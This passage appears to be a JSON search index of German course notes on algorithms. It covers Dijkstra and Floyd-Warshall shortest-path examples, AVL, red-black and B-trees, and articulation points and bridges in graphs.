Beispielgraph","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#schritt-fur-schritt-start-bei-a","title":"\u2705 Schritt-f\u00fcr-Schritt (Start bei A)","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#initialisierung","title":"\ud83d\udd39 Initialisierung:","text":"Knoten A (Start) B C D Distanz 0 \u221e \u221e \u221e Vorg\u00e4nger - - - -","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#iteration-1-start-bei-a","title":"\ud83d\udd39 Iteration 1: Start bei A","text":"<ul> <li>Nachbarn von A:<ul> <li>(A \u2192 B) = 4 \u2192 aktualisiere B: Distanz = 4</li> <li>(A \u2192 C) = 1 \u2192 aktualisiere C: Distanz = 1</li> <li>(A \u2192 D) = 2 \u2192 aktualisiere D: Distanz = 2</li> </ul> </li> </ul> Knoten A B C D Distanz 0 4 1 2 Vorg\u00e4nger - A A A <ul> <li>Markiere A als besucht.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#iteration-2-wahle-den-knoten-mit-der-kleinsten-distanz-c","title":"\ud83d\udd39 Iteration 2: W\u00e4hle den Knoten mit der kleinsten Distanz \u2192 C","text":"<ul> <li> <p>Nachbarn von C:</p> <ul> <li>(C \u2192 D) = 3</li> <li>Pr\u00fcfen: Distanz \u00fcber C zu D = 1 + 3 = 4 \u2192 NICHT k\u00fcrzer als aktueller Wert (2). \u2192 Keine \u00c4nderung.</li> <li>Markiere C als besucht.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#iteration-3-wahle-den-knoten-mit-der-kleinsten-distanz-d","title":"\ud83d\udd39 Iteration 3: W\u00e4hle den Knoten mit der kleinsten Distanz \u2192 D","text":"<ul> <li> <p>Nachbarn von D:</p> <ul> <li>(D \u2192 B) = 5</li> <li>Pr\u00fcfen: Distanz \u00fcber D zu B = 2 + 5 = 7 \u2192 NICHT k\u00fcrzer als aktueller Wert (4). \u2192 Keine \u00c4nderung.</li> <li>Markiere D als besucht.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#iteration-4-wahle-den-letzten-unbesuchten-knoten-b","title":"\ud83d\udd39 Iteration 4: W\u00e4hle den letzten unbesuchten Knoten \u2192 B","text":"<ul> <li> <p>Keine weiteren Updates notwendig.</p> </li> <li> <p>Markiere B als besucht.</p> </li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#endergebnis-kurzeste-distanzen-von-a","title":"\ud83c\udfc6 Endergebnis (k\u00fcrzeste Distanzen von A):","text":"Knoten A B C D Distanz 0 4 1 2 Vorg\u00e4nger - A A A <ul> <li>K\u00fcrzeste Wege:<ul> <li>A \u2192 B = 4 (direkt)</li> <li>A \u2192 C = 1 (direkt)</li> <li>A \u2192 D = 2 (direkt)</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#fazit-dijkstra","title":"Fazit - Dijkstra","text":"<ul> <li>\u2705 Standard-Dijkstra: Findet den k\u00fcrzesten Weg von einem Startknoten zu allen anderen.</li> <li>\u2705 Optimierter Dijkstra: F\u00fcr einen bestimmten Zielknoten kann der Algorithmus abgebrochen werden, sobald das Ziel erreicht ist.</li> <li>\u2705 Vorg\u00e4nger speichern: Erm\u00f6glicht es, den exakten Pfad zu rekonstruieren.</li> <li>\u2705 Anwendungen: Navigation, Netzwerke, Routenplanung.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#floyd-warshall-algorithmus-all-pairs-shortest-path-apsp","title":"Floyd-Warshall-Algorithmus - All-Pairs Shortest Path (APSP)","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#was-ist-der-floyd-warshall-algorithmus","title":"\ud83d\udcda Was ist der Floyd-Warshall-Algorithmus?","text":"<p>Der Floyd-Warshall-Algorithmus ist ein dynamischer Programmieralgorithmus, der die k\u00fcrzesten Wege zwischen allen Knotenpaaren in einem gewichteten, gerichteten Graphen findet.</p> <ul> <li>\u2705 All-Pairs Shortest Path (APSP): Berechnet die k\u00fcrzesten Distanzen f\u00fcr jedes Knotenpaar (u,v)(u, v)(u,v).</li> <li>\u2705 Funktioniert mit positiven und negativen Kantengewichten, solange kein negativer Zyklus vorhanden ist.</li> <li>\u2705 Ja, Zyklen sind erlaubt, wenn sie helfen, den k\u00fcrzesten Weg zu finden.</li> <li>\ud83d\udea9 Aber: Negative Zyklen (Zyklen, deren Gesamtkantengewicht &lt; 0) sind problematisch, weil man dann unendlich oft im Kreis laufen k\u00f6nnte, um die Distanz weiter zu verringern.</li> <li>\u274c Nicht effizient f\u00fcr gro\u00dfe, sp\u00e4rliche Graphen (besser geeignet f\u00fcr dichte Graphen).</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#2-grundidee_1","title":"\ud83d\udd11 2\ufe0f\u20e3 Grundidee","text":"<ul> <li> <p>F\u00fcr jeden Knoten <code>k</code> im Graphen pr\u00fcfen wir: \"Ist der Weg von <code>i</code> nach <code>j</code> k\u00fcrzer, wenn ich \u00fcber <code>k</code> gehe?\"</p> </li> <li> <p>Formel (Transition): \\(\\(dist[i][j]=min\u2061(dist[i][j],dist[i][k]+dist[k][j])\\)\\)</p> </li> <li> <p>Das bedeutet:</p> <ul> <li>Entweder: Wir behalten den aktuellen k\u00fcrzesten Weg von <code>i</code> nach <code>j</code>.</li> <li>Oder: Wir nehmen den Umweg \u00fcber <code>k</code>, wenn dieser k\u00fcrzer ist.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#3-beispielgraph_1","title":"\ud83d\uddfa\ufe0f 3\ufe0f\u20e3 Beispielgraph","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#initialisierung-der-distanzmatrix","title":"\u2705 Initialisierung der Distanzmatrix","text":"<ul> <li>Unendliche Distanz (INF = \u221e) f\u00fcr nicht direkt verbundene Knoten.</li> <li>0 f\u00fcr die Diagonale (Distanz von einem Knoten zu sich selbst).</li> </ul> \\[ D^{(0)} = \\begin{bmatrix} 0 &amp; 4 &amp; 1 &amp; \\infty \\\\ \\infty &amp; 0 &amp; \\infty &amp; 5 \\\\ \\infty &amp; \\infty &amp; 0 &amp; 3 \\\\ \\infty &amp; \\infty &amp; \\infty &amp; 0 \\end{bmatrix} \\]","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#4-schritt-fur-schritt-iteration-uber-knoten-als-zwischenknoten","title":"\ud83d\ude80 4\ufe0f\u20e3 Schritt-f\u00fcr-Schritt (Iteration \u00fcber Knoten als Zwischenknoten)","text":"<p>Wir iterieren \u00fcber jeden Knoten k als Zwischenknoten:</p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#iteration-1-knoten-a-als-zwischenknoten-k-0","title":"\ud83d\udd39 Iteration 1: Knoten A als Zwischenknoten (k = 0)","text":"<ul> <li>Keine k\u00fcrzeren Wege \u00fcber A \u2192 Matrix bleibt gleich.</li> </ul> \\[ D^{(1)} = \\begin{bmatrix} 0 &amp; 4 &amp; 1 &amp; \\infty \\\\ \\infty &amp; 0 &amp; \\infty &amp; 5 \\\\ \\infty &amp; \\infty &amp; 0 &amp; 3 \\\\ \\infty &amp; \\infty &amp; \\infty &amp; 0 \\end{bmatrix} \\]","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#iteration-2-knoten-b-als-zwischenknoten-k-1","title":"\ud83d\udd39 Iteration 2: Knoten B als Zwischenknoten (k = 1)","text":"<ul> <li>Pr\u00fcfen, ob ein Weg von A \u2192 D \u00fcber B k\u00fcrzer ist:<ul> <li>A \u2192 B + B \u2192 D = 4 + 5 = 9</li> <li>Bisher: A \u2192 D = \u221e     \u2705 Update: A \u2192 D = 9</li> </ul> </li> </ul> <p>Aktualisierte Matrix:</p> \\[ D^{(2)} = \\begin{bmatrix} 0 &amp; 4 &amp; 1 &amp; 9 \\\\ \\infty &amp; 0 &amp; \\infty &amp; 5 \\\\ \\infty &amp; \\infty &amp; 0 &amp; 3 \\\\ \\infty &amp; \\infty &amp; \\infty &amp; 0 \\end{bmatrix} \\]","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#iteration-3-knoten-c-als-zwischenknoten-k-2","title":"\ud83d\udd39 Iteration 3: Knoten C als Zwischenknoten (k = 2)","text":"<ul> <li>Pr\u00fcfen, ob der Weg von A \u2192 D \u00fcber C k\u00fcrzer ist:<ul> <li>A \u2192 C + C \u2192 D = 1 + 3 = 4</li> <li>Bisher: A \u2192 D = 9     \u2705 Update: A \u2192 D = 4 (besser!)</li> </ul> </li> </ul> <p>Aktualisierte Matrix:   </p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#iteration-4-knoten-d-als-zwischenknoten-k-3","title":"\ud83d\udd39 Iteration 4: Knoten D als Zwischenknoten (k = 3)","text":"<ul> <li>Keine weiteren Verbesserungen, da D keine ausgehenden Kanten hat.</li> </ul> \\[ D^{(4)} = \\begin{bmatrix} 0 &amp; 4 &amp; 1 &amp; 4 \\\\ \\infty &amp; 0 &amp; \\infty &amp; 5 \\\\ \\infty &amp; \\infty &amp; 0 &amp; 3 \\\\ \\infty &amp; \\infty &amp; \\infty &amp; 0 \\end{bmatrix} \\]","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#5-endergebnis-kurzeste-distanzen","title":"\ud83c\udfc6 5\ufe0f\u20e3 Endergebnis: K\u00fcrzeste Distanzen","text":"\\[ D^{(4)} = \\begin{bmatrix} 0 &amp; 4 &amp; 1 &amp; 4 \\\\ \\infty &amp; 0 &amp; \\infty &amp; 5 \\\\ \\infty &amp; \\infty &amp; 0 &amp; 3 \\\\ \\infty &amp; \\infty &amp; \\infty &amp; 0 \\end{bmatrix} \\] <ul> <li>K\u00fcrzeste Wege:<ul> <li>A \u2192 B = 4</li> <li>A \u2192 C = 1</li> <li>A \u2192 D = 4 (\u00fcber C)</li> <li>B \u2192 D = 5</li> <li>C \u2192 D = 3</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/4.%20K%C3%BCrzeste%20Weg/#beide-finden-den-kurzesten-weg-aber-fur-verschiedene-zwecke","title":"Beide finden den k\u00fcrzesten Weg - aber f\u00fcr verschiedene Zwecke","text":"Kriterium Dijkstra-Algorithmus Floyd-Warshall-Algorithmus Zweck K\u00fcrzeste Wege von einem Startknoten zu allen anderen (Single-Source) K\u00fcrzeste Wege zwischen allen Knotenpaaren (All-Pairs) Kantengewichte Nur nicht-negative Kantengewichte Negative Kantengewichte erlaubt, aber keine negativen Zyklen Zyklen Vermeidet Zyklen, da er den k\u00fcrzesten Weg direkt findet Zyklen sind erlaubt, wenn sie den Weg verk\u00fcrzen Effizienz Besser f\u00fcr sp\u00e4rliche Graphen Besser f\u00fcr dichte Graphen Laufzeit O((V+E)log\u2061V)O((V + E) \\log V)O((V+E)logV) (mit Heap) O(V3)O(V^3)O(V3)","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/","title":"Selbstbalancierende B\u00e4ume","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#selbstbalancierende-baume","title":"Selbstbalancierende B\u00e4ume","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#avl-baume-selbstbalancierende-binarbaume","title":"\ud83d\ude80 AVL-B\u00e4ume - Selbstbalancierende Bin\u00e4rb\u00e4ume","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#1-was-ist-ein-avl-baum","title":"\ud83d\udcda 1\ufe0f\u20e3 Was ist ein AVL-Baum?","text":"<p>Ein AVL-Baum ist ein selbstbalancierender bin\u00e4rer Suchbaum (BST). Er wurde nach seinen Erfindern Adelson-Velsky und Landis benannt.</p> <ul> <li>\u2705 Eigenschaft: F\u00fcr jeden Knoten gilt:  \\(\\(BF = H\u00f6he\u00a0(linker\u00a0Teilbaum)\u2212H\u00f6he\u00a0(rechter\u00a0Teilbaum) \u22641\\)\\)</li> <li> <p>Das hei\u00dft: Die H\u00f6he der linken und rechten Teilb\u00e4ume darf sich um maximal 1 unterscheiden.</p> </li> <li> <p>BF = +1: Linker Teilbaum ist um 1 h\u00f6her \u2192 leicht nach links geneigt.</p> </li> <li>BF = 0: Beide Teilb\u00e4ume sind gleich hoch \u2192 perfekt balanciert.</li> <li>BF = -1: Rechter Teilbaum ist um 1 h\u00f6her \u2192 leicht nach rechts geneigt.</li> </ul> \ud83d\udd0d Pseudo-Code <pre><code>FUNKTION insert(node, key):\n    WENN node leer:\n        GIB neuen Knoten mit key zur\u00fcck\n\n    WENN key &lt; node.key:\n        node.left = insert(node.left, key)\n    ANDERNFALLS:\n        node.right = insert(node.right, key)\n\n    AKTUALISIERE H\u00f6he von node\n    balance = Balance-Faktor(node)\n\n    // 4 Rotationsf\u00e4lle\n    WENN balance &gt; 1 UND key &lt; node.left.key:\n        GIB rechts-rotation(node)    // LL-Fall\n\n    WENN balance &lt; -1 UND key &gt; node.right.key:\n        GIB links-rotation(node)     // RR-Fall\n\n    WENN balance &gt; 1 UND key &gt; node.left.key:\n        node.left = links-rotation(node.left)  // LR-Fall\n        GIB rechts-rotation(node)\n\n    WENN balance &lt; -1 UND key &lt; node.right.key:\n        node.right = rechts-rotation(node.right)  // RL-Fall\n        GIB links-rotation(node)\n\n    GIB node zur\u00fcck\n</code></pre>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#4-avl-rotationen-zur-balancierung","title":"\u26a1 4\ufe0f\u20e3 AVL-Rotationen zur Balancierung","text":"<p>Wenn ein AVL-Baum aus dem Gleichgewicht ger\u00e4t, wird er durch Rotationen korrigiert. Es gibt 4 Rotationstypen:</p> <p></p> <p>\ud83d\udd17 Studyfix - Studyfix</p> <p>1\ufe0f\u20e3 LL-Rotation (Links-Links-Fall):</p> <ul> <li>Ungleichgewicht: Neuer Knoten wurde im linken Teilbaum des linken Kindes eingef\u00fcgt.</li> <li>L\u00f6sung: Rechtsrotation (Right Rotation)</li> </ul> <pre><code>    3\n   /\n  2\n /\n1\n</code></pre> <p>\u27a1\ufe0f Nach Rechtsrotation:</p> <pre><code>    2\n   / \\\n  1   3\n</code></pre> <p>2\ufe0f\u20e3 RR-Rotation (Rechts-Rechts-Fall):</p> <ul> <li>Ungleichgewicht: Neuer Knoten wurde im rechten Teilbaum des rechten Kindes eingef\u00fcgt.</li> <li>L\u00f6sung: Linksrotation (Left Rotation)</li> </ul> <pre><code>  1\n   \\\n    2\n     \\\n      3\n</code></pre> <p>\u27a1\ufe0f Nach Linksrotation:</p> <pre><code>    2\n   / \\\n  1   3\n</code></pre> <p>3\ufe0f\u20e3 LR-Rotation (Links-Rechts-Fall):</p> <ul> <li>Ungleichgewicht: Neuer Knoten wurde im rechten Teilbaum des linken Kindes eingef\u00fcgt.</li> <li>L\u00f6sung: Zweifache Rotation:<ol> <li>Linksrotation am linken Kind</li> <li>Rechtsrotation am unbalancierten Knoten</li> </ol> </li> </ul> <pre><code>    3\n   /\n  1\n   \\\n    2\n</code></pre> <p>\u27a1\ufe0f Nach Doppelrotation:</p> <pre><code>    2\n   / \\\n  1   3\n</code></pre> <p>4\ufe0f\u20e3 RL-Rotation (Rechts-Links-Fall):</p> <ul> <li>Ungleichgewicht: Neuer Knoten wurde im linken Teilbaum des rechten Kindes eingef\u00fcgt.</li> <li>L\u00f6sung: Zweifache Rotation:<ol> <li>Rechtsrotation am rechten Kind</li> <li>Linksrotation am unbalancierten Knoten</li> </ol> </li> </ul> <pre><code>  1\n   \\\n    3\n   /\n  2\n</code></pre> <p>\u27a1\ufe0f Nach Doppelrotation:</p> <pre><code>    2\n   / \\\n  1   3\n</code></pre>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#5-avl-baum-einfugen-insert","title":"\ud83d\ude80 5\ufe0f\u20e3 AVL-Baum Einf\u00fcgen (Insert)","text":"<ol> <li>Normal einf\u00fcgen (wie in einem BST).</li> <li>Balance-Faktoren berechnen.</li> <li>Rotation anwenden, falls der Baum aus dem Gleichgewicht ist.</li> </ol>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#beispiel-avl-einfugeoperation","title":"\u2705 Beispiel: AVL-Einf\u00fcgeoperation","text":"<p>Einf\u00fcgen der Knoten in dieser Reihenfolge: <code>10 \u2192 20 \u2192 30</code></p> <p>1\ufe0f\u20e3 F\u00fcge 10 ein: </p><pre><code>10\n</code></pre> 2\ufe0f\u20e3 F\u00fcge 20 ein: <pre><code>  10\n    \\\n     20\n</code></pre> - Balance-Faktor von 10: -1 (ok)<p></p> <p>3\ufe0f\u20e3 F\u00fcge 30 ein: </p><pre><code>  10\n    \\\n     20\n       \\\n        30\n</code></pre><p></p> <ul> <li>Balance-Faktor von 10: -2 (ungleichgewichtig) \u2192 RR-Fall</li> <li>\u2705 L\u00f6sung: Linksrotation bei 10. \u27a1\ufe0f Nach Rotation: <pre><code>    20\n   /  \\\n  10   30\n</code></pre></li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#9-laufzeitanalyse","title":"\ud83d\ude80 9\ufe0f\u20e3 Laufzeitanalyse","text":"<ul> <li>Suchen, Einf\u00fcgen, L\u00f6schen: O(log\u2061n)O(\\log n)O(logn)</li> <li>Balancierung: O(log\u2061n)O(\\log n)O(logn) durch Rotationen</li> <li>Speicherkomplexit\u00e4t: O(n)O(n)O(n)</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#10-fazit","title":"\ud83c\udfaf 1\ufe0f\u20e30\ufe0f\u20e3 Fazit","text":"<ul> <li>\u2705 AVL-B\u00e4ume sind immer balanciert, daher sehr effizient f\u00fcr Suchoperationen.</li> <li>\u2705 Rotationen (LL, RR, LR, RL) halten den Baum ausgeglichen.</li> <li>\u2705 Laufzeit f\u00fcr alle Operationen: \\(O(log\u2061n)\\)</li> <li>\u2705 Anwendungen: Datenbanken, Indexstrukturen, Speichermanagement.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#rot-schwarz-baume-selbstbalancierende-binarbaume","title":"\ud83d\ude80 Rot-Schwarz-B\u00e4ume - Selbstbalancierende Bin\u00e4rb\u00e4ume","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#1-was-ist-ein-rot-schwarz-baum","title":"\ud83d\udcda 1\ufe0f\u20e3 Was ist ein Rot-Schwarz-Baum?","text":"<p>Ein Rot-Schwarz-Baum ist ein selbstbalancierender bin\u00e4rer Suchbaum (BST), der sicherstellt, dass der Baum immer ungef\u00e4hr balanciert bleibt. Er ist eine Alternative zu AVL-B\u00e4umen, verwendet jedoch eine andere Strategie zur Balancierung, die effizienter f\u00fcr h\u00e4ufige Einf\u00fcgungen und L\u00f6schungen ist.</p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#2-eigenschaften-von-rot-schwarz-baumen","title":"\ud83d\udd11 2\ufe0f\u20e3 Eigenschaften von Rot-Schwarz-B\u00e4umen","text":"<ol> <li>Jeder Knoten ist entweder rot oder schwarz.</li> <li>Die Wurzel ist immer schwarz.</li> <li>Alle Bl\u00e4tter (NIL-Knoten) sind schwarz.</li> <li>Ein roter Knoten hat keine roten Kinder (keine zwei roten Knoten direkt hintereinander).</li> <li>Jeder Pfad von der Wurzel zu einem Blatt hat die gleiche Anzahl schwarzer Knoten (schwarze H\u00f6he).</li> </ol> <p>Diese Regeln sorgen daf\u00fcr, dass der Baum immer logarithmisch hoch bleibt, was schnelle Such-, Einf\u00fcge- und L\u00f6schoperationen erm\u00f6glicht.</p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#3-balance-konzept-schwarze-hohe","title":"\ud83d\udcca 3\ufe0f\u20e3 Balance-Konzept: Schwarze H\u00f6he","text":"<ul> <li>Die schwarze H\u00f6he eines Knotens ist die Anzahl der schwarzen Knoten auf dem Weg von diesem Knoten bis zu einem Blatt.</li> <li>Wichtige Regel: Alle Pfade von der Wurzel zu den Bl\u00e4ttern m\u00fcssen die gleiche schwarze H\u00f6he haben.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#4-insert-einfugen-in-einen-rot-schwarz-baum","title":"\ud83d\ude80 4\ufe0f\u20e3 Insert (Einf\u00fcgen) in einen Rot-Schwarz-Baum","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#schritt-fur-schritt","title":"\u2705 Schritt-f\u00fcr-Schritt:","text":"<ol> <li>F\u00fcge den Knoten wie in einem normalen BST ein.</li> <li>F\u00e4rbe den neuen Knoten immer ROT.</li> <li>Verletzen der Rot-Schwarz-Regeln?<ul> <li>Falls ja, werden Rotationen und Umf\u00e4rbungen angewendet.</li> </ul> </li> <li>Stelle sicher, dass die Wurzel am Ende immer SCHWARZ ist.</li> </ol> \ud83d\udd0d Pseudo-Code Vereinfacht - Insert <pre><code>INSERT(node, key):\n    F\u00fcge key normal wie im BST ein\n    F\u00e4rbe den neuen Knoten ROT\n\n    WHILE (Elternknoten ROT):\n        IF (Elternknoten ist linkes Kind):\n            WENN Onkel ROT:\n                F\u00e4rbe Eltern &amp; Onkel SCHWARZ, Gro\u00dfeltern ROT\n                Setze Gro\u00dfeltern als neuen Knoten\n            ANDERNFALLS:\n                WENN der Knoten ein rechtes Kind ist:\n                    Linksrotation am Elternknoten\n                Rechtsrotation am Gro\u00dfelternknoten\n                Farben von Eltern &amp; Gro\u00dfeltern umkehren\n\n        (Symmetrischer Fall f\u00fcr rechtes Kind)\n\n    Wurzel immer SCHWARZ f\u00e4rben\n</code></pre>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#rotationen","title":"\ud83d\udd04 Rotationen:","text":"<ul> <li>Linksrotation (Left Rotation): Dreht eine Kante nach links.</li> <li>Rechtsrotation (Right Rotation): Dreht eine Kante nach rechts.</li> </ul> <p>Diese Rotationstypen helfen dabei, die Balance des Baums wiederherzustellen.</p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#beispielgraph","title":"\ud83d\uddfa\ufe0f Beispielgraph","text":"<p>\ud83d\udd17 Studyfix - Studyfix</p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#5-delete-loschen-in-einem-rot-schwarz-baum","title":"\ud83d\udea9 5\ufe0f\u20e3 Delete (L\u00f6schen) in einem Rot-Schwarz-Baum","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#schritt-fur-schritt_1","title":"\u2705 Schritt-f\u00fcr-Schritt:","text":"<ol> <li>L\u00f6sche den Knoten wie in einem BST.</li> <li>Falls ein schwarzer Knoten gel\u00f6scht wird:<ul> <li>\"Doppelschwarz\"-Problem kann auftreten (Ungleichgewicht).</li> </ul> </li> <li>L\u00f6sen durch:<ul> <li>Rotationen</li> <li>Umf\u00e4rbungen</li> <li>Transfer schwarzer H\u00f6he</li> </ul> </li> </ol>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#b-baume-selbstbalancierende-suchbaume-fur-groe-datenmengen","title":"\ud83d\ude80 B-B\u00e4ume - Selbstbalancierende Suchb\u00e4ume f\u00fcr gro\u00dfe Datenmengen","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#1-was-ist-ein-b-baum","title":"\ud83d\udcda 1\ufe0f\u20e3 Was ist ein B-Baum?","text":"<p>Ein B-Baum ist eine selbstbalancierende Baumstruktur, die speziell f\u00fcr den Einsatz in Datenbanken und Dateisystemen entwickelt wurde. Er kann mehrere Schl\u00fcssel pro Knoten speichern und hat mehr als zwei Kinder \u2192 generalisierter AVL-Baum.</p> <ul> <li>\u2705 Eigenschaft: Effizient f\u00fcr gro\u00dfe Datenmengen, da er weniger tief ist (im Vergleich zu AVL/Red-Black-B\u00e4umen).</li> <li>\u2705 Optimal f\u00fcr Festplatten &amp; Speicherzugriffe, da gro\u00dfe Bl\u00f6cke auf einmal verarbeitet werden.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#2-eigenschaften-eines-b-baums-ordnung-m","title":"\ud83d\udd11 2\ufe0f\u20e3 Eigenschaften eines B-Baums (Ordnung m)","text":"<p>Ein B-Baum der Ordnung m hat:</p> <ul> <li>Maximal \\(m\u22121\\) Schl\u00fcssel pro Knoten</li> <li>Mindestens \\(\u2308m/2\u2309 - 1\\) Schl\u00fcssel pro Knoten (au\u00dfer der Wurzel)</li> <li>Maximal \\(m\\) Kinder pro Knoten</li> <li>Jeder interne Knoten mit \\(k\\) Schl\u00fcsseln hat genau \\(k+1\\) Kinder</li> <li>Alle Bl\u00e4tter sind auf derselben Ebene \u2192 Baum ist immer balanciert.</li> </ul> <p></p> <p>\ud83d\udd17 Studyfix - Studyfix</p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/5.%20Selbstbalancierende%20B%C3%A4ume/#8-fazit","title":"\u2705 8\ufe0f\u20e3 Fazit","text":"<ul> <li>B-B\u00e4ume sind optimal f\u00fcr gro\u00dfe Datenmengen.</li> <li>\u2705 Insert: Einf\u00fcgen + Split bei \u00dcberlauf.</li> <li>\u2705 Delete: L\u00f6schen + Merge/Redistribute bei Unterlauf.</li> <li>\u2705 Anwendungen: Datenbanken, Dateisysteme (z.B. NTFS, MySQL, PostgreSQL).</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/6.%20Graphentheorie/","title":"Graphentheorie","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/6.%20Graphentheorie/#graphentheorie","title":"Graphentheorie","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/6.%20Graphentheorie/#artikulationspunkte-brucken-in-graphen","title":"\ud83d\ude80 Artikulationspunkte &amp; Br\u00fccken in Graphen","text":"<p>Wir starten jetzt mit dem Thema Artikulationspunkte (Cut Vertices) und Br\u00fccken (Bridges) in Graphen. Diese Konzepte sind besonders wichtig f\u00fcr die Analyse von Netzwerken und Verbindungsstrukturen.</p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/6.%20Graphentheorie/#1-was-sind-artikulationspunkte-und-brucken","title":"\ud83d\udcda 1\ufe0f\u20e3 Was sind Artikulationspunkte und Br\u00fccken?","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/6.%20Graphentheorie/#artikulationspunkt-cut-vertex","title":"\u2705 Artikulationspunkt (Cut Vertex):","text":"<ul> <li> <p>\u2705 Artikulationspunkt (Cut Vertex): Trennung durch Entfernen eines Knotens.</p> </li> <li> <p>Ein Artikulationspunkt ist ein Knoten in einem zusammenh\u00e4ngenden ungerichteten Graphen, dessen Entfernung den Graphen in zwei oder mehr separate Teilgraphen aufteilt.</p> </li> <li>Bedeutung: Wenn ein Artikulationspunkt ausf\u00e4llt, kann das Netzwerk auseinanderbrechen.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/6.%20Graphentheorie/#brucke-bridge-oder-cut-edge","title":"\u2705 Br\u00fccke (Bridge oder Cut Edge):","text":"<ul> <li> <p>\u2705 Br\u00fccke (Cut Edge): Trennung durch Entfernen einer Kante.</p> </li> <li> <p>Eine Br\u00fccke ist eine Kante, deren Entfernung den Graphen ebenfalls in zwei oder mehr 